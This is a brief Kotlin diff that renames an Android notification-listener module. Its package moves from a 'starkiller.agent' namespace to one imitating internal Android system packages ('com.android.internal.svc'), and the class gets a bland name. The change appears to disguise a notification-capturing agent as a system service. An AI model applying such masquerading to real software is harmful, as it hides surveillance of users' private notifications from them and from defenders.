@@ -1,10 +1,10 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import java.util.concurrent.ConcurrentLinkedQueue
 
-class NotifListenerService : NotificationListenerService() {
+class AlertService : NotificationListenerService() {
 
     companion object {
         val buffer = ConcurrentLinkedQueue<String>()
